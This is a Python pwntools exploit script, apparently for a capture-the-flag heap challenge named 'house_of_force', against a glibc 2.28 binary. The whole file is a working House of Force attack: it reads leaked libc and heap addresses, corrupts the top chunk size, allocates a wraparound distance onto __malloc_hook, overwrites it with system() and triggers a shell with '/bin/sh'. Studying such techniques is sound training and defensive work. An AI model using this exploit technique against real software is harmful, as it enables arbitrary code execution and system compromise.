#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF('./house_of_force_patched',checksec=False)
libc = ELF('./libc-2.28.so')
p =  process()
# Select the "malloc" option; send size & data.
def malloc(size, data):
    p.send(b"1")
    p.sendafter(b"size: ", f"{size}".encode())
    p.sendafter(b"data: ", data)
    p.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y
gdb.attach(p,gdbscript='''
           b*0x00000000004009BE   
           ''')

# This binary leaks the address of puts(), use it to resolve the libc load address.
p.recvuntil(b"puts() @ ")
libc.address = int(p.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
p.recvuntil(b"heap @ ")
heap = int(p.recvline(), 16) + 0xa0 - 16
p.recvuntil(b"> ")
p.timeout = 0.1
print(hex(heap))
# =============================================================================
input()
malloc(24, b"Z" * 24 + p64(0xffffffffffffffff))
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
sleep(1)
malloc(distance, "/bin/sh\x00")
malloc(24,p64(libc.sym.system))
malloc((heap+0x30),"")
# malloc(24, "crow was here")

# =============================================================================

p.interactive()
